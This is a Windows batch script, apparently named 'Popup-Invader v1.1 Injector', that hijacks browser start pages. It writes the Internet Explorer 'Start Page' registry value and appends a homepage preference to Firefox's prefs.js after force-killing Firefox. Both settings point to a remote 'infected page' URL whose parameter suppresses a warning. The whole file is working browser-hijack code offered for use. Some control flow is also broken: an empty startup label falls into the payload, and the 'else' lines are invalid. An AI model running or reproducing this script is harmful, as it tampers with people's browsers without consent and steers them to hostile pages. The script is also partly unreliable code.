@echo off

rem Popup-Invader v1.1 Injector for Windows by Renaud42 from Fire-Softwares
rem       Supported browsers : Internet Explorer, Mozilla Firefox

rem Here you can change the URL of Popup-Invader infected page
rem Warning : adding ?confirm=yes param to the default URL will made
rem Popup-Invader launching by itself without the warning.
set POPUP_INVADER_URL="https://cdn.fire-softwares.ga/popup-invader?confirm=yes"

goto ask-ie

:reset-to-windir
cd %WINDIR%

:ask-ie
rem Asking about Internet Explorer injection
echo Inject to Internet Explorer ? (y for yes, anything else for no)
set INPUT=
set /P INPUT=Your answer : %=%
if /I "%INPUT%"=="y" goto ie-payload
else goto ask-firefox

:ask-firefox
rem Asking about Mozilla Firefox injection
echo Inject to Mozilla Firefox ? (y for yes, anything else for no)
set INPUT=
set /P INPUT=Your answer : %=%
if /I "%INPUT%"=="y" goto firefox-payload
else goto startup

:startup
rem Asking about creating link to launch automatically Popup-Invader at Windows startup

:ie-payload
rem Internet Explorer injection
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /V "Start Page" /D "%POPUP_INVADER_URL%" /F
goto ask-firefox

:firefox-payload
rem Mozilla Firefox injection
taskkill /IM firefox.exe* /F
cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
cd *.default
set MOZ_PREFS_DIR=%cd%
echo user_pref("browser.startup.homepage", "%POPUP_INVADER_URL%"); >> "%MOZ_PREFS_DIR%\prefs.js"
set MOZ_PREFS_DIR=
